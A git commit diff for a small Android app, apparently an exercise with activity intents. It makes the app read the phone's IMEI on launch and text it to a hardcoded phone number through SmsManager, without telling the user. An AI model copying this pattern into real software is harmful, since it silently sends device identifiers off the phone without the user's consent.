3d780b6af60420182ac8a59d66ba7502c0b94b8d
shivapbhusal <civabhusal@gmail.com>
2018-02-02 18:57:55 -0500

    finalize getActivity

--- StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/GetActivity.java
+++ StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/GetActivity.java
@@ -1,18 +1,21 @@
 package com.example.shiva.statefulintent;
 
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 
-public class SendActivity extends AppCompatActivity {
+public class GetActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_send);
-        String imei="abc";
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId();
         Intent returnIntent=new Intent();
         returnIntent.putExtra("result",imei);
         setResult(Activity.RESULT_OK,returnIntent);
--- StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/MainActivity.java
+++ StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/MainActivity.java
@@ -1,12 +1,9 @@
 package com.example.shiva.statefulintent;
 
-import android.app.Activity;
-import android.content.Context;
 import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.telephony.SmsManager;
-import android.telephony.TelephonyManager;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -14,25 +11,16 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        Intent i = new Intent(this, SendActivity.class);
+        Intent i = new Intent(MainActivity.this, GetActivity.class);
         startActivityForResult(i, 1);
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data)
     {
-        if (resultCode==1){
-            if (resultCode== Activity.RESULT_OK){
                 String imei=data.getStringExtra("result");
-                sendImei(imei);
-            }
-
-            if (resultCode==Activity.RESULT_CANCELED){
-
-            }
-
-        }
-
+                SmsManager sms = SmsManager.getDefault();
+                sms.sendTextMessage("4193784172", null, imei, null, null);
     }
 
     public void sendImei(String imei)
